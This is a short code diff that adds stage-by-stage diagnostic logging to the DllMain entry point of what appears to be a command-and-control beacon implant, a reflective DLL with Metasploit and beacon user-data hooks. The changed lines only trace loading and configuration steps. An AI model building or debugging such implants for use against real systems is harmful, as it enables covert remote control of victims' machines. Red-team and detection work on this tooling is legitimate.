@@ -172,10 +172,12 @@ static void bw_diag2(const char *stage) {
 }
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 	MEMORY_BASIC_INFORMATION mbi;
+	bw_diag2("dllmain_top");
 
 	switch( dwReason ) {
 		case DLL_BEACON_USER_DATA: {
 			USER_DATA_UD * ud = (USER_DATA_UD *)lpReserved;
+			bw_diag2("user_data");
 			if (ud != NULL && ud->length >= 8 && ud->version >= 1) {
 				BeaconSetCustomUserData(ud->customData);
 				if (ud->length >= (unsigned int)(sizeof(USER_DATA_UD) - 32)) {
@@ -191,8 +193,11 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 			break;
 		case DLL_PROCESS_ATTACH:
 			/* 只解析配置；beacon 循环不在 ATTACH 阶段启动 —— 见 DLL_METASPLOIT_ATTACH。 */
+			bw_diag2("attach_in");
 			settings_init_once(hinstDLL);
+			bw_diag2("attach_settings_done");
 			register_exception_tables(hinstDLL);
+			bw_diag2("attach_done");
 			break;
 		case DLL_METASPLOIT_ATTACH:
 			bw_diag2("rdll_enter");
